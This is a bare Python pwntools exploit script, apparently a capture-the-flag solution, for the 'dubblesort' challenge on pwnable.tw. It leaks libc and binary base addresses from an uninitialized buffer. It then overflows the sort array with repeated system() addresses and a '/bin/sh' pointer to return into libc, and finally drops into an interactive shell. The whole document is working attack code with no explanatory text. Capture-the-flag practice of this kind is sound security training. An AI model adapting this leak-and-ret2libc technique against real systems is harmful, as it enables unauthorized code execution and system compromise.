from pwn import *

e = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")

if "--remote" in sys.argv:
  p = remote("chall.pwnable.tw", 10101)
else:
  p = process(["./ld-linux-32.so", e.path], env={"LD_PRELOAD": libc.path})

p.sendafter(":", "A" * 0x19)
p.recvuntil("A" * 0x19)

libc_base = u32("\x00" + p.recv(3)) - 0x1b0000
p.recv(4)
binary_base = u32(p.recv(4)) - 0x601
print("{:#x}".format(binary_base))
print("Main: {:#x}".format(binary_base + e.symbols["main"]))
print("{:#x}".format(libc_base))
print("{:#x}".format(libc_base + libc.symbols["system"]))
print("{:#x}".format(libc_base + next(libc.search("/bin/sh"))))


size = 6 * 4 + 3 * 4 + 3 + 4
p.sendlineafter("sort :", str(size))
for i in range(6 * 4 - 3 - 6):
  p.sendlineafter(":", "0")

for i in range(8):
  p.sendlineafter(":", str(libc_base + libc.symbols["system"]))
p.sendlineafter(":", str(libc_base + next(libc.search("/bin/sh"))))
p.sendlineafter(":", "A")

p.recvuntil("Result :")
for i in range(size):
  print(("> ! " if i == 32 or i == 24 else "> ") +"{:#x}".format(int(p.recvuntil(" "))))

p.interactive()
